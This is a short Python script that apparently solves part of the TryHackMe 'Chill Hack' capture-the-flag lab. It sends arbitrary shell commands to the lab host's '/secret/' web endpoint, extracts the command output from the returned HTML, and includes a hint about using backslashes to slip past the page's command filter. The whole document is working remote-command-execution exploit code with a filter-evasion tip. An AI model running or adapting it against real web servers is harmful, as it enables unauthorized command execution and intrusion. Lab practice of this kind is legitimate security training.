#!/usr/bin/python3

import requests
import sys
import re

if len(sys.argv) == 1:
	print(f"Usage: {sys.argv[0]} command")
	sys.exit()

url = 'http://chillhack.thm/'

data = {
  'command': sys.argv[1]
}

response = requests.post(url + 'secret/', data=data)
if "Are you a hacker?" not in response.text:
	print("[+] Response: ")
	response = re.findall('<h2 style="color:blue;">(.*?)\n</h2>', response.text)
	print(response[0])
else:
	print("[-] Hacker Detected")
	print("[*] Note: Use Double \ Instead Of One As It Is Python Escape Character")
